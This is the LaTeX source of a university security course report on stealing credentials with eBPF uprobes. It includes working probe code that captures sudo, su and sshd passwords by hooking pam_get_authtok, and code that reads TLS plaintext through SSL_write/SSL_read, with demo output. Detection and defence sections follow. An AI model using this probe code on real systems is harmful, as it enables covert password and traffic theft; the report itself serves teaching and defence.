@@ -1,0 +1,815 @@
+\documentclass[11pt,a4paper]{article}
+
+% --- Packages ---
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[margin=2.5cm]{geometry}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{booktabs}
+\usepackage{enumitem}
+\usepackage{amsmath}
+\usepackage{caption}
+\usepackage{float}
+\usepackage{parskip}
+\usepackage{fancyhdr}
+\usepackage[backend=biber,style=ieee]{biblatex}
+
+% --- Bibliography ---
+\addbibresource{references.bib}
+
+% --- Colors ---
+\definecolor{codebg}{RGB}{245,245,245}
+\definecolor{codeframe}{RGB}{200,200,200}
+\definecolor{keyword}{RGB}{0,0,180}
+\definecolor{comment}{RGB}{0,128,0}
+\definecolor{string}{RGB}{163,21,21}
+\definecolor{accent}{RGB}{0,90,160}
+
+% --- Listings ---
+\lstdefinestyle{cstyle}{
+    language=C,
+    backgroundcolor=\color{codebg},
+    frame=single,
+    rulecolor=\color{codeframe},
+    basicstyle=\ttfamily\small,
+    keywordstyle=\color{keyword}\bfseries,
+    commentstyle=\color{comment}\itshape,
+    stringstyle=\color{string},
+    breaklines=true,
+    numbers=left,
+    numberstyle=\tiny\color{gray},
+    numbersep=8pt,
+    tabsize=4,
+    showstringspaces=false,
+    captionpos=b,
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+}
+
+\lstdefinestyle{pythonstyle}{
+    language=Python,
+    backgroundcolor=\color{codebg},
+    frame=single,
+    rulecolor=\color{codeframe},
+    basicstyle=\ttfamily\small,
+    keywordstyle=\color{keyword}\bfseries,
+    commentstyle=\color{comment}\itshape,
+    stringstyle=\color{string},
+    breaklines=true,
+    numbers=left,
+    numberstyle=\tiny\color{gray},
+    numbersep=8pt,
+    tabsize=4,
+    showstringspaces=false,
+    captionpos=b,
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+}
+
+\lstdefinestyle{shellstyle}{
+    backgroundcolor=\color{codebg},
+    frame=single,
+    rulecolor=\color{codeframe},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    numbers=none,
+    showstringspaces=false,
+    captionpos=b,
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+}
+
+% --- Allow linebreaks in \texttt ---
+\usepackage[htt]{hyphenat}
+
+% --- Header / Footer ---
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\textit{ADSS -- Serverless Credential Theft with eBPF Uprobes}}
+\fancyhead[R]{\small\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+% --- Hyperlinks ---
+\hypersetup{
+    colorlinks=true,
+    linkcolor=accent,
+    citecolor=accent,
+    urlcolor=accent,
+}
+
+% ============================================================================
+\begin{document}
+
+% --- Title Page ---
+\begin{titlepage}
+    \centering
+    \vspace*{2cm}
+
+    {\Large Hochschule Luzern -- Informatik\\[0.3em]}
+    {\large Advanced Security (ADSS) -- Final Project\\[2cm]}
+
+    \rule{\textwidth}{1pt}\\[0.6cm]
+    {\Huge\bfseries Serverless Credential Theft\\with eBPF Uprobes\\[0.4cm]}
+    \rule{\textwidth}{1pt}\\[1.5cm]
+
+    {\large Intercepting Cleartext Credentials and TLS Traffic\\
+    via User-Space Probes on Linux\\[3cm]}
+
+    {\large
+    \begin{tabular}{ll}
+        \textbf{Author:}  & TODO \\
+        \textbf{Date:}    & \today \\
+        \textbf{Module:}  & Advanced Security (ADSS) \\
+    \end{tabular}
+    }
+
+    \vfill
+    {\small\textit{Disclaimer: This project is for educational and authorized research purposes only.}}
+\end{titlepage}
+
+% --- Table of Contents ---
+\newpage
+\tableofcontents
+\newpage
+
+% ============================================================================
+\section{Introduction}
+\label{sec:introduction}
+% ============================================================================
+
+Traditional approaches to credential theft on Linux systems rely on well-known
+techniques such as keyloggers, memory dumps, or network sniffing. Each of these
+methods carries significant operational drawbacks: keyloggers are noisy and must
+persist as user-space processes, memory forensics requires precise timing and
+knowledge of data structures, and network sniffing is rendered ineffective by
+ubiquitous encryption (TLS/SSH).
+
+This project demonstrates a fundamentally different approach:
+\textbf{serverless credential theft using eBPF user-space probes (uprobes)}.
+Rather than recording all input or attempting to break encryption, the technique
+places a precise, surgical tap at the exact point in memory where a password or
+plaintext payload exists---after decryption but before hashing or further
+processing.
+
+The core idea is analogous to a sniper rifle versus a dragnet: instead of
+capturing everything and filtering later, the attacker instruments a single
+library function and waits. When a victim authenticates, the eBPF program
+fires, reads the cleartext credential directly from a CPU register or stack
+argument, and stores it silently. The legitimate application continues
+uninterrupted; no log entries are created and no anomalous network traffic is
+generated at the moment of theft.
+
+We implement and demonstrate two attack vectors in a single tool:
+
+\begin{enumerate}
+    \item \textbf{PAM authentication interception} -- capturing passwords from
+          \texttt{sudo}, \texttt{su}, \texttt{ssh} (server-side), and any
+          PAM-aware service by hooking \texttt{pam\_get\_authtok} in
+          \texttt{libpam.so}.
+    \item \textbf{SSL/TLS plaintext interception} -- reading HTTP requests and
+          responses in cleartext by hooking \texttt{SSL\_write} and
+          \texttt{SSL\_read} in \texttt{libssl.so}, bypassing TLS encryption
+          entirely.
+\end{enumerate}
+
+The remainder of this report is structured as follows.
+Section~\ref{sec:background} introduces eBPF, uprobes, and the targeted
+libraries. Section~\ref{sec:design} describes the architecture and
+implementation of the tool. Section~\ref{sec:demonstration} walks through
+practical usage scenarios. Section~\ref{sec:detection} discusses detection
+methods and defensive measures. Section~\ref{sec:limitations} covers
+limitations and potential extensions. Section~\ref{sec:conclusion} concludes
+the report.
+
+
+% ============================================================================
+\section{Background}
+\label{sec:background}
+% ============================================================================
+
+% ----------------------------------------------------------------------------
+\subsection{Extended Berkeley Packet Filter (eBPF)}
+\label{subsec:ebpf}
+% ----------------------------------------------------------------------------
+
+eBPF (Extended Berkeley Packet Filter) is a technology built into the Linux
+kernel that allows user-supplied programs to run in a sandboxed virtual machine
+inside kernel space. Originally designed for packet filtering, eBPF has evolved
+into a general-purpose in-kernel execution engine used for observability,
+networking, and security \cite{gregg2019}.
+
+Key properties of eBPF relevant to this project:
+
+\begin{itemize}
+    \item \textbf{Safety guarantees.} Before loading, every eBPF program is
+          analyzed by an in-kernel verifier that ensures the program terminates,
+          does not access out-of-bounds memory, and does not crash the kernel.
+          This makes eBPF programs safe to run---ironically, even when their
+          intent is malicious.
+    \item \textbf{Minimal overhead.} eBPF programs are JIT-compiled to native
+          machine code. An attached probe fires only when its hook point is
+          triggered, making the technique essentially zero-cost when idle.
+    \item \textbf{Root-only loading.} Loading eBPF programs requires
+          \texttt{CAP\_BPF} (or \texttt{CAP\_SYS\_ADMIN} on older kernels).
+          This means the attacker must already have root access---the technique
+          is a post-exploitation persistence and data collection mechanism,
+          not an initial access vector.
+    \item \textbf{No kernel module required.} Unlike traditional rootkits that
+          require a loadable kernel module (LKM), eBPF programs are loaded via
+          the \texttt{bpf()} syscall and do not appear in \texttt{lsmod} output.
+\end{itemize}
+
+% ----------------------------------------------------------------------------
+\subsection{Probes: Kprobes and Uprobes}
+\label{subsec:probes}
+% ----------------------------------------------------------------------------
+
+eBPF programs are attached to \textit{hook points} in the system. Two families
+of dynamic probes are relevant:
+
+\begin{description}
+    \item[Kprobes (Kernel Probes)] attach to functions inside the kernel. For
+        example, a kprobe on \texttt{tcp\_sendmsg} would fire every time any
+        process sends TCP data.
+    \item[Uprobes (User-Space Probes)] attach to functions inside user-space
+        binaries or shared libraries. A uprobe on \texttt{SSL\_write} in
+        \texttt{libssl.so} fires every time \textit{any} process linked against
+        that library calls \texttt{SSL\_write}.
+\end{description}
+
+Both probe types support two variants:
+
+\begin{itemize}
+    \item \textbf{Entry probes} fire when the function is entered. At this
+          point, function arguments are available in CPU registers (following
+          the System V AMD64 ABI: \texttt{\%rdi}, \texttt{\%rsi},
+          \texttt{\%rdx}, \texttt{\%rcx}, \texttt{\%r8}, \texttt{\%r9}).
+    \item \textbf{Return probes} (uretprobes) fire when the function returns.
+          At this point, the return value is in \texttt{\%rax}, and
+          output parameters written during the function's execution can be read
+          from the pointers captured at entry time.
+\end{itemize}
+
+Uprobes work by temporarily replacing the first byte of the target function
+with an \texttt{INT3} (breakpoint) instruction. When the CPU hits this
+instruction, it traps into the kernel, which dispatches the eBPF program,
+then restores the original instruction and resumes execution
+\cite{kernel_uprobe}.
+
+% ----------------------------------------------------------------------------
+\subsection{BCC (BPF Compiler Collection)}
+\label{subsec:bcc}
+% ----------------------------------------------------------------------------
+
+BCC is a toolkit that simplifies eBPF development by providing a Python (and
+Lua) frontend \cite{bcc_repo}. The developer writes the eBPF probe logic in a
+restricted subset of C, which BCC compiles to eBPF bytecode at runtime using
+LLVM/Clang. The Python wrapper handles:
+
+\begin{itemize}
+    \item Compilation of the C source to eBPF bytecode.
+    \item Loading and verification of the program via the \texttt{bpf()} syscall.
+    \item Attaching the program to the specified hook points.
+    \item Reading data from eBPF maps (shared memory between kernel and
+          user space) or the trace pipe.
+\end{itemize}
+
+This project uses BCC to keep the implementation self-contained in a single
+Python script with an embedded C program.
+
+% ----------------------------------------------------------------------------
+\subsection{Target Libraries}
+\label{subsec:targets}
+% ----------------------------------------------------------------------------
+
+\subsubsection{PAM (Pluggable Authentication Modules)}
+
+PAM is the standard authentication framework on Linux \cite{pam_docs}. When a
+user authenticates via \texttt{sudo}, \texttt{su}, \texttt{sshd}, \texttt{login},
+or any PAM-aware service, the following call chain occurs:
+
+\begin{enumerate}
+    \item The service calls \texttt{pam\_authenticate()}.
+    \item Internally, the PAM module calls
+          \texttt{pam\_get\_authtok(pamh, PAM\_AUTHTOK, \&password, prompt)}.
+    \item On return, \texttt{password} points to a null-terminated string
+          containing the user's cleartext password.
+\end{enumerate}
+
+The function signature is:
+
+\begin{lstlisting}[style=cstyle, caption={pam\_get\_authtok signature}, label={lst:pam_sig}]
+int pam_get_authtok(pam_handle_t *pamh, int item,
+                    const char **authtok, const char *prompt);
+\end{lstlisting}
+
+The third parameter (\texttt{authtok}) is an output pointer---on return,
+\texttt{*authtok} contains the address of the cleartext password string. This
+is the value we intercept.
+
+\subsubsection{OpenSSL (libssl)}
+
+OpenSSL's \texttt{libssl.so} provides the TLS implementation used by
+\texttt{curl}, \texttt{wget}, \texttt{python-requests}, web servers, and
+countless other applications \cite{openssl_docs}. The two functions of
+interest are:
+
+\begin{lstlisting}[style=cstyle, caption={SSL\_write and SSL\_read signatures}, label={lst:ssl_sig}]
+int SSL_write(SSL *ssl, const void *buf, int num);
+int SSL_read(SSL *ssl, void *buf, int num);
+\end{lstlisting}
+
+\begin{itemize}
+    \item \texttt{SSL\_write}: The \texttt{buf} parameter contains plaintext
+          data \textit{before} encryption. Hooking at entry allows us to read
+          outgoing data (e.g., HTTP requests, API keys, POST bodies).
+    \item \texttt{SSL\_read}: The \texttt{buf} parameter is populated with
+          plaintext data \textit{after} decryption when the function returns.
+          Hooking at return allows us to read incoming data (e.g., HTTP
+          responses).
+\end{itemize}
+
+
+% ============================================================================
+\section{Design and Implementation}
+\label{sec:design}
+% ============================================================================
+
+% ----------------------------------------------------------------------------
+\subsection{Architecture Overview}
+\label{subsec:architecture}
+% ----------------------------------------------------------------------------
+
+The tool consists of a single Python script (\texttt{ebpf\_spy.py}) with two
+logical components:
+
+\begin{enumerate}
+    \item \textbf{eBPF C program} (embedded as a string) -- compiled and loaded
+          into the kernel at runtime by BCC. Contains the probe functions and
+          shared data maps.
+    \item \textbf{Python userspace loader} -- handles library discovery,
+          argument parsing, probe attachment, and output formatting.
+\end{enumerate}
+
+Figure~\ref{fig:architecture} illustrates the data flow.
+
+\begin{figure}[H]
+\centering
+\small
+\begin{verbatim}
+    +------------------+          +------------------+
+    |   User Process   |          |   User Process   |
+    |  (sudo, curl,..) |          |  (sudo, curl,..) |
+    +--------+---------+          +--------+---------+
+             |                             |
+             | calls pam_get_authtok()     | calls SSL_write()/SSL_read()
+             v                             v
+    +--------+---------+          +--------+---------+
+    |   libpam.so      |          |   libssl.so      |
+    | [INT3 inserted]  |          | [INT3 inserted]  |
+    +--------+---------+          +--------+---------+
+             |                             |
+             | trap to kernel              | trap to kernel
+             v                             v
+    +--------------------------------------------------+
+    |              Linux Kernel (eBPF VM)               |
+    |                                                   |
+    |  trace_pam_entry()   trace_ssl_write()            |
+    |  trace_pam_return()  trace_ssl_read_entry()       |
+    |                      trace_ssl_read_return()      |
+    |                                                   |
+    |  [ BPF_HASH maps: pam_params_map, ssl_read_map ] |
+    +----------------------------+----------------------+
+                                 |
+                                 | trace_pipe / bpf_trace_printk
+                                 v
+    +----------------------------+----------------------+
+    |            ebpf_spy.py (Python, root)             |
+    |  - Compiles & loads BPF program                   |
+    |  - Attaches uprobes to library functions           |
+    |  - Reads and displays intercepted data            |
+    +--------------------------------------------------+
+\end{verbatim}
+\caption{Architecture and data flow of the eBPF spy tool.}
+\label{fig:architecture}
+\end{figure}
+
+% ----------------------------------------------------------------------------
+\subsection{eBPF Data Maps}
+\label{subsec:maps}
+% ----------------------------------------------------------------------------
+
+The eBPF program uses two \texttt{BPF\_HASH} maps to pass data between entry
+and return probes within the same function invocation:
+
+\begin{table}[H]
+\centering
+\caption{eBPF hash maps used in the tool.}
+\label{tab:maps}
+\begin{tabular}{@{}llll@{}}
+\toprule
+\textbf{Map Name}      & \textbf{Key}  & \textbf{Value}      & \textbf{Purpose} \\
+\midrule
+\texttt{pam\_params\_map} & Thread ID & \texttt{char **} (pointer to authtok) & Pass authtok address from entry to return \\
+\texttt{ssl\_read\_map}   & Thread ID & \texttt{char *} (buffer address)      & Pass buffer address from entry to return \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+Maps are necessary because CPU registers are not preserved between the entry
+probe and the return probe---the function execution overwrites them. By storing
+the relevant pointer in a map keyed by the current thread ID, the return probe
+can retrieve it and dereference the now-populated output parameter.
+
+% ----------------------------------------------------------------------------
+\subsection{PAM Interception}
+\label{subsec:pam_impl}
+% ----------------------------------------------------------------------------
+
+The PAM interception uses a two-stage uprobe/uretprobe pattern:
+
+\textbf{Stage 1 -- Entry (\texttt{trace\_pam\_entry}):}
+When \texttt{pam\_get\_authtok} is called, the third argument (\texttt{\%rdx}
+on x86\_64, accessed via \texttt{PT\_REGS\_PARM3}) contains the address of the
+\texttt{authtok} output pointer. This address is saved into
+\texttt{pam\_params\_map}.
+
+\begin{lstlisting}[style=cstyle, caption={PAM entry probe}, label={lst:pam_entry}]
+int trace_pam_entry(struct pt_regs *ctx) {
+    struct key_t key = {};
+    char **authtok_ptr_addr;
+
+    key.pid = bpf_get_current_pid_tgid();
+    authtok_ptr_addr = (char **)PT_REGS_PARM3(ctx);
+    pam_params_map.update(&key, &authtok_ptr_addr);
+    return 0;
+}
+\end{lstlisting}
+
+\textbf{Stage 2 -- Return (\texttt{trace\_pam\_return}):}
+When \texttt{pam\_get\_authtok} returns, the output pointer has been populated
+by the PAM module. The return probe looks up the saved address, performs two
+levels of pointer dereferencing using \texttt{bpf\_probe\_read\_user}, and
+reads the cleartext password string.
+
+\begin{lstlisting}[style=cstyle, caption={PAM return probe}, label={lst:pam_return}]
+int trace_pam_return(struct pt_regs *ctx) {
+    struct key_t key = {};
+    char ***authtok_pp;
+    char **authtok_p;
+    char *authtok_val;
+    char captured_str[80] = {};
+
+    key.pid = bpf_get_current_pid_tgid();
+    authtok_pp = pam_params_map.lookup(&key);
+    if (authtok_pp == 0) return 0;
+
+    authtok_p = *authtok_pp;
+    bpf_probe_read_user(&authtok_val, sizeof(authtok_val), authtok_p);
+    bpf_probe_read_user_str(captured_str, sizeof(captured_str), authtok_val);
+    bpf_trace_printk("PAM Spy: PID %d returned authtok='%s'\n",
+                     key.pid, captured_str);
+    pam_params_map.delete(&key);
+    return 0;
+}
+\end{lstlisting}
+
+The double indirection is necessary because \texttt{pam\_get\_authtok} takes a
+\texttt{const char **authtok}---a pointer to a pointer. At entry, we capture the
+address of the pointer (\texttt{char **}). At return, we first read where the
+pointer now points (\texttt{char *}), then read the string at that address.
+
+% ----------------------------------------------------------------------------
+\subsection{SSL/TLS Interception}
+\label{subsec:ssl_impl}
+% ----------------------------------------------------------------------------
+
+SSL interception requires different strategies for write and read operations:
+
+\textbf{SSL\_write -- Entry probe only:}
+The plaintext buffer is the second argument (\texttt{PT\_REGS\_PARM2}). Since
+the data exists in the buffer \textit{before} the function executes (it is an
+input parameter), a single entry probe suffices.
+
+\begin{lstlisting}[style=cstyle, caption={SSL\_write entry probe}, label={lst:ssl_write}]
+int trace_ssl_write(struct pt_regs *ctx) {
+    char *buf_addr;
+    char captured_data[80] = {};
+    u32 pid = bpf_get_current_pid_tgid();
+
+    buf_addr = (char *)PT_REGS_PARM2(ctx);
+    bpf_probe_read_user(captured_data, sizeof(captured_data), buf_addr);
+    bpf_trace_printk("SSL WRITE (PID %d): %s\n", pid, captured_data);
+    return 0;
+}
+\end{lstlisting}
+
+\textbf{SSL\_read -- Entry + return probe:}
+The buffer address is available at entry (second argument), but the data is
+only written into the buffer by OpenSSL during the function's execution. Thus,
+the entry probe saves the buffer address to \texttt{ssl\_read\_map}, and the
+return probe reads the now-populated buffer.
+
+% ----------------------------------------------------------------------------
+\subsection{Library Discovery}
+\label{subsec:discovery}
+% ----------------------------------------------------------------------------
+
+The Python loader must locate the shared libraries on disk to attach uprobes.
+It uses a two-step strategy:
+
+\begin{enumerate}
+    \item \texttt{ctypes.util.find\_library()} -- queries the system's dynamic
+          linker cache (\texttt{ldconfig}).
+    \item Fallback to a list of common absolute paths for various distributions
+          (Debian/Ubuntu, RHEL/CentOS, Arch).
+\end{enumerate}
+
+The user can also override library paths via \texttt{-{}-libpam} and
+\texttt{-{}-libssl} command-line arguments.
+
+
+% ============================================================================
+\section{Demonstration}
+\label{sec:demonstration}
+% ============================================================================
+
+This section demonstrates the tool against three realistic scenarios. All tests
+were performed on an Ubuntu/Debian-based system with kernel 6.x and BCC
+installed.
+
+% ----------------------------------------------------------------------------
+\subsection{Scenario 1: Intercepting \texttt{sudo} Passwords}
+\label{subsec:demo_pam}
+% ----------------------------------------------------------------------------
+
+\textbf{Setup:} Start the tool in PAM mode.
+
+\begin{lstlisting}[style=shellstyle]
+$ sudo python3 ebpf_spy.py --mode pam
+[*] Compiling BPF program...
+[*] Attaching PAM probes to /lib/x86_64-linux-gnu/libpam.so.0...
+    -> PAM probes attached.
+------------------------------------------------------------
+[*] Listening... (Mode: pam)
+\end{lstlisting}
+
+\textbf{Trigger:} In a second terminal, a user runs \texttt{sudo ls} and enters
+their password.
+
+\textbf{Result:}
+\begin{lstlisting}[style=shellstyle]
+sudo-1234  [002] .... 12345.678: PAM Spy: PID 1234 returned authtok='s3cretP@ss!'
+\end{lstlisting}
+
+The cleartext password is captured the instant the PAM module receives it,
+before it is hashed for comparison against \texttt{/etc/shadow}.
+
+% ----------------------------------------------------------------------------
+\subsection{Scenario 2: Intercepting HTTPS Traffic}
+\label{subsec:demo_ssl}
+% ----------------------------------------------------------------------------
+
+\textbf{Setup:} Start the tool in SSL mode.
+
+\begin{lstlisting}[style=shellstyle]
+$ sudo python3 ebpf_spy.py --mode ssl
+[*] Compiling BPF program...
+[*] Attaching SSL probes to /usr/lib/x86_64-linux-gnu/libssl.so.3...
+    -> SSL probes attached.
+------------------------------------------------------------
+[*] Listening... (Mode: ssl)
+\end{lstlisting}
+
+\textbf{Trigger:} In a second terminal, run \texttt{curl https://example.com}.
+
+\textbf{Result:}
+\begin{lstlisting}[style=shellstyle]
+curl-5678 [001] .... 12346.789: SSL WRITE (PID 5678): GET / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.88
+curl-5678 [001] .... 12346.800: SSL READ (PID 5678): HTTP/1.1 200 OK
+Content-Type: text/html
+\end{lstlisting}
+
+The full HTTP request and response are captured in cleartext, despite the
+connection being encrypted with TLS. Any sensitive data in transit---cookies,
+authorization headers, API keys, POST bodies---would be visible.
+
+% ----------------------------------------------------------------------------
+\subsection{Scenario 3: SSH Server-Side Password Capture}
+\label{subsec:demo_ssh}
+% ----------------------------------------------------------------------------
+
+\textbf{Setup:} On a server running \texttt{sshd}, start the tool in PAM mode.
+
+When a remote user connects via \texttt{ssh user@server} and enters their
+password, the tool captures it identically to the \texttt{sudo} scenario.
+This is because \texttt{sshd} uses PAM for password authentication and calls
+the same \texttt{pam\_get\_authtok} function.
+
+\textbf{Note on SSH client-side capture:} Capturing passwords on the
+\textit{client} side (i.e., the password typed into the \texttt{ssh} command)
+is more complex because the \texttt{ssh} binary is typically stripped of debug
+symbols. The README describes two strategies: installing debug symbols to hook
+\texttt{read\_passphrase}, or hooking \texttt{libc}'s \texttt{read()} syscall
+wrapper filtered by process name and file descriptor. These are not implemented
+in the current version but represent viable extensions.
+
+
+% ============================================================================
+\section{Detection and Defense}
+\label{sec:detection}
+% ============================================================================
+
+While the technique is stealthy, it is not invisible. This section discusses
+how defenders can detect and mitigate eBPF-based credential theft.
+
+% ----------------------------------------------------------------------------
+\subsection{Detection Methods}
+\label{subsec:detection_methods}
+% ----------------------------------------------------------------------------
+
+\begin{description}
+    \item[eBPF program enumeration.]
+        The \texttt{bpftool} utility can list all loaded eBPF programs:
+        \begin{lstlisting}[style=shellstyle]
+$ sudo bpftool prog list
+42: kprobe  name trace_pam_entry  tag abc123  gpl
+43: kprobe  name trace_pam_return tag def456  gpl
+        \end{lstlisting}
+        Any unexpected programs---especially those with names referencing
+        \texttt{pam}, \texttt{ssl}, or \texttt{trace}---warrant investigation.
+
+    \item[Uprobe event inspection.]
+        Active uprobes are listed in the kernel's tracefs:
+        \begin{lstlisting}[style=shellstyle]
+$ sudo cat /sys/kernel/debug/tracing/uprobe_events
+p:uprobes/... /lib/.../libpam.so.0:0x... trace_pam_entry
+        \end{lstlisting}
+        An unexpected uprobe on \texttt{libpam.so} or \texttt{libssl.so} is a
+        strong indicator of compromise.
+
+    \item[Process monitoring.]
+        The Python loader process (\texttt{ebpf\_spy.py}) must remain running
+        to read output from the trace pipe. Standard process monitoring or EDR
+        tools may flag a root-owned Python process reading from
+        \texttt{/sys/kernel/debug/tracing/trace\_pipe}.
+
+    \item[Audit subsystem.]
+        The Linux audit framework can be configured to log \texttt{bpf()}
+        syscalls:
+        \begin{lstlisting}[style=shellstyle]
+$ sudo auditctl -a always,exit -F arch=b64 -S bpf -k ebpf_audit
+        \end{lstlisting}
+        This creates an audit trail whenever eBPF programs are loaded.
+\end{description}
+
+% ----------------------------------------------------------------------------
+\subsection{Defensive Measures}
+\label{subsec:defenses}
+% ----------------------------------------------------------------------------
+
+\begin{description}
+    \item[Restrict eBPF access.]
+        Set \texttt{kernel.unprivileged\_bpf\_disabled=1} via sysctl to prevent
+        unprivileged eBPF usage. On hardened systems, consider using
+        \textbf{lockdown mode}
+        (\texttt{kernel\_lockdown=\allowbreak{}integrity} or
+        \texttt{confidentiality}) which restricts eBPF capabilities even for
+        root.
+
+    \item[Secure Boot and module signing.]
+        While eBPF does not use kernel modules, Secure Boot with lockdown mode
+        prevents loading arbitrary eBPF programs that access kernel memory.
+
+    \item[SELinux / AppArmor policies.]
+        Mandatory Access Control frameworks can restrict which processes are
+        allowed to use the \texttt{bpf()} syscall and which files they can
+        attach probes to.
+
+    \item[Runtime integrity monitoring.]
+        Tools like \textbf{Tracee} (by Aqua Security) or \textbf{Falco}
+        (by Sysdig) use eBPF themselves to monitor for suspicious eBPF program
+        loads and attachment events---essentially using the technology to defend
+        against itself.
+
+    \item[Hardware security tokens.]
+        For SSH authentication, using FIDO2/U2F hardware keys eliminates
+        password-based authentication entirely, rendering PAM password
+        interception ineffective.
+\end{description}
+
+
+% ============================================================================
+\section{Limitations and Future Work}
+\label{sec:limitations}
+% ============================================================================
+
+% ----------------------------------------------------------------------------
+\subsection{Current Limitations}
+\label{subsec:limitations}
+% ----------------------------------------------------------------------------
+
+\begin{enumerate}
+    \item \textbf{Requires root access.} The technique is post-exploitation
+          only. An attacker must already have root (or \texttt{CAP\_BPF}) to
+          load eBPF programs.
+
+    \item \textbf{Capture buffer size.} The eBPF verifier imposes strict limits
+          on stack size (512 bytes). Our 80-byte capture buffer is sufficient
+          for passwords but truncates longer SSL payloads.
+
+    \item \textbf{Output via \texttt{trace\_pipe}.} Using
+          \texttt{bpf\_trace\_printk} writes to a shared global trace buffer.
+          Output from other tracing tools or kernel debug messages may
+          intermix. The trace pipe is also limited to roughly 1000 characters
+          per message.
+
+    \item \textbf{PID filtering granularity.} The current implementation uses
+          the lower 32 bits of \texttt{bpf\_get\_current\_\allowbreak{}pid\_tgid()},
+          which is the kernel thread ID (TID), not the user-space PID (TGID).
+          This can cause incorrect behavior for multi-threaded applications.
+
+    \item \textbf{Stripped binaries.} The tool cannot hook functions in
+          stripped binaries (e.g., the default \texttt{ssh} client) because
+          uprobes require symbol names to resolve function addresses.
+
+    \item \textbf{No process name in output.} The current output includes only
+          the PID, making it harder to quickly identify which application
+          triggered the probe.
+\end{enumerate}
+
+% ----------------------------------------------------------------------------
+\subsection{Future Work}
+\label{subsec:future}
+% ----------------------------------------------------------------------------
+
+\begin{enumerate}
+    \item \textbf{Perf event output.} Replace \texttt{bpf\_trace\_printk} with
+          \texttt{BPF\_PERF\_OUTPUT} or \texttt{BPF\_RINGBUF} for a dedicated,
+          higher-bandwidth output channel with structured data.
+
+    \item \textbf{SSH client-side capture.} Implement Strategy B from the
+          README: hook \texttt{libc}'s \texttt{read()} filtered by process
+          name (\texttt{ssh}) and file descriptor (stdin, fd~0).
+
+    \item \textbf{Process metadata.} Use \texttt{bpf\_get\_current\_comm()} to
+          include the process name in output events, and correct the PID
+          extraction to use \texttt{bpf\_get\_current\_pid\_tgid() >> 32}.
+
+    \item \textbf{Covert exfiltration.} Demonstrate exfiltration channels such
+          as writing to a hidden file, DNS tunneling, or ICMP covert channels
+          to illustrate the full attack lifecycle.
+
+    \item \textbf{Containerized environments.} Test and document behavior in
+          Docker/Kubernetes environments where the host kernel's eBPF subsystem
+          can be leveraged to spy on containerized workloads.
+
+    \item \textbf{Additional library targets.} Extend to other libraries such
+          as \texttt{libgnutls} (used by \texttt{wget} on some distributions),
+          \texttt{libssh}, or application-specific libraries.
+\end{enumerate}
+
+
+% ============================================================================
+\section{Conclusion}
+\label{sec:conclusion}
+% ============================================================================
+
+This project demonstrates that eBPF user-space probes represent a powerful and
+stealthy post-exploitation technique for credential theft on Linux systems. By
+attaching uprobes to \texttt{pam\_get\_authtok} in \texttt{libpam.so} and
+\texttt{SSL\_write}/\texttt{SSL\_read} in \texttt{libssl.so}, an attacker with
+root access can silently intercept cleartext passwords and TLS-protected
+traffic without modifying any files, generating network anomalies, or deploying
+a traditional rootkit.
+
+The technique exploits a fundamental architectural property: shared libraries
+are loaded into every process that uses them, and uprobes are system-wide. A
+single probe attachment intercepts calls from \textit{all} processes---every
+\texttt{sudo}, \texttt{su}, \texttt{ssh} login, \texttt{curl} request, and
+Python HTTPS call on the system.
+
+From a defensive perspective, the technique is detectable through eBPF program
+enumeration (\texttt{bpftool}), uprobe event inspection, and audit logging of
+the \texttt{bpf()} syscall. Kernel lockdown mode, mandatory access control
+policies, and hardware-based authentication provide effective mitigations.
+
+The key takeaway for security practitioners is that eBPF has shifted the
+attacker's toolkit from noisy kernel modules to verified, JIT-compiled,
+low-overhead programs that the kernel itself is designed to execute safely.
+Defenders must adapt their monitoring to account for this capability.
+
+
+% ============================================================================
+% REFERENCES
+% ============================================================================
+\newpage
+\printbibliography[title={References}]
+
+\end{document}
